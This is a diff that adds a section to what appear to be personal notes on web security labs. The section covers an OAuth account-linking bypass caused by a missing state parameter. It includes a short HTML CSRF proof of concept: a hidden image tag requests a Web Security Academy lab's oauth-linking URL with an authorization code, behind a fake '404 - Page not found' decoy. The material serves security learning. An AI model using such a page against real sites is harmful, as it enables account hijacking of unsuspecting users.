@@ -140,3 +140,18 @@ Authorization: Bearer z0y9x8w7v6u5
 <img width="788" height="557" alt="image" src="https://github.com/user-attachments/assets/3e49724d-c8f8-4779-932a-5d503c25d60a" />
 
 --------------
+
+### Oauth Bypass due to lack of state  hash in authorization request
+
+---------------
+
+- Csrf POC-:
+
+```html
+<meta name="referrer" content="never">
+<img src="https://0a5b00f7049636f180e20366002f00ca.web-security-academy.net/oauth-linking?code=7706vS22XU7a0_7Y6GPlqfZGp-0me34AOyF1-euZB5y" style="display:none" />
+<h1>404 - Page not found</h1>
+The URL you are requesting is no longer available
+```
+
+-------------
